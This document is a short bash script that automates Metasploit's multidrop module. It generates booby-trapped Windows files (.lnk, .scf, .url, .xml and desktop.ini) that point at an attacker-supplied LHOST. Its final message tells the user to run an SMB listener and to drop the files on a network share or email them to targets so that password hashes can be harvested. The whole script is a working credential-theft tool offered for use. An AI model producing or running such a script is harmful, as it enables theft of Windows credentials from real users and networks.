#!/bin/bash

filetypes=("lnk" "scf" "url" "xml")

clear; echo "[*] Malicious File Dropper - Windows Hash Pass Back"

read -p "[*] Enter your LHOST IP: " LHOST

echo "[*] Starting Metasploit and generating payloads..."
for i in "${filetypes[@]}"
	do msfconsole -n -q -x "use auxiliary/fileformat/multidrop; set LHOST $LHOST; set FILENAME contact_list.$i; run; exit"
	done

msfconsole -n -q -x "use auxiliary/fileformat/multidrop; set LHOST $LHOST; set FILENAME desktop.ini; run; exit" # Must be named desktop.ini or it receives a FILENAME error in MSF.

mv /root/.msf4/local/contact_list* .
mv /root/.msf4/local/desktop.ini .

echo "[*] Payloads generated and saved to `pwd`."
echo "[*] Prepare to capture hashes by setting up an SMB listener and drop the files on a network share or email them to your target."



